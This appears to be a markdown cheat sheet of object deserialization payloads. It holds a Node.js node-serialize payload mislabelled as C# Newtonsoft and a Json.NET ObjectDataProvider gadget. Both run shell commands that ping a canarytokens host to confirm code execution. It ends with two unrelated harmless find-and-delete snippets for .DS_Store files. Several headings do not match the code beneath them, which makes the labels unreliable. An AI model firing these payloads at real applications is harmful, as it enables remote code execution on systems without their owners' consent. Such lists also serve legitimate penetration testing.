# Object Deserialization
## C# Newtonsoft
```sh
{"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('ping XXXXXXXXX.canarytokens.com', (error, stdout, stderr) => { console.log(stdout); }); } ()"}

```
#####

## Search for a string
```sh
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', 'ping -n 3 ping XXXXXXXXX.canarytokens.com']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
#####

## Find and delete files
```sh
#!/bin/sh

find . -name ".DS_Store*" -print 2>/dev/null |  xargs rm 

```
#####

## Find and delete files (in case of a space in path we should use)
```sh
#!/bin/sh

find . -name ".DS_Store*" -exec rm {} + 2>/dev/null 

```
